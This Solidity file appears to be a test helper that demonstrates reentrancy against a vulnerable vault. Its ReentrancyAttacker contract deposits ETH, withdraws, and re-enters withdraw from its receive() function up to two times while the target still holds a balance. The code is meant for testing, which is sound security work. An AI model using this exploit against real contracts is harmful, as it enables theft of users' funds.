// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Test helper for demonstrating the vulnerable vault pattern.
contract ReentrancyAttacker {
    IVault public target;
    uint256 public attackCount;
    uint256 public maxAttacks = 2;

    constructor(address _target) {
        target = IVault(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "need eth");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= msg.value) {
            attackCount += 1;
            target.withdraw();
        }
    }
}
